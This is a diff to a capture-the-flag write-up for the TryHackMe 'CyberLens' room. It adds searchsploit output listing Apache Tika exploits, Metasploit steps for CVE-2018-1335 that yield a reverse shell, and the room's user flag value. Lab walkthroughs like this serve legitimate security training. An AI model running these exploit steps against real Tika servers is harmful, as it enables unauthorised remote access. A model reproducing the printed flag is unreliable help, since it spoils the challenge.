@@ -111,6 +111,22 @@ One google search and we have [RCE (CVE-2018–1335)](https://rhinosecuritylabs.
 and https://www.exploit-db.com/exploits/47208. Now we use the `metasploit` module. It has a module for this CVE so that's convenient!
 
 We can do `searchsploit tika` it will give you the details of all tika exploits that are present on this system. It will tell exact path if you use `-m`. 
+```
+──(truelyyours㉿kali)-[~/tryhackme/CyberLens]
+└─$ searchsploit tika     
+------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                |  Path
+------------------------------------------------------------------------------ ---------------------------------
+Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)               | windows/remote/47208.rb
+Apache Tika-server < 1.18 - Command Injection                                 | windows/remote/46540.py
+Joomla! Component com_cartikads 1.0 - Arbitrary File Upload                   | php/webapps/10984.txt
+Mitra Informatika Solusindo cart - SQL Injection                              | php/webapps/5214.txt
+------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+```
+
+We can then do `metasploit` exploit as follows:
 ```bash
 msfconsole
 use exploit/windows/http/apache_tika_jp2_jscript
@@ -123,4 +139,10 @@ exploit
 ```
 Run this and you'll have the reverse shell! Nice!
 ![[Pasted image 20250731203344.png]]
+
+Go to `C:\Users\CyberLens\Desktop` and the flag is in `user.txt`.
+`THM{T1k4-CV3-f0r-7h3-w1n}`
+
+And we have the user flag 🎉😎!
+
 
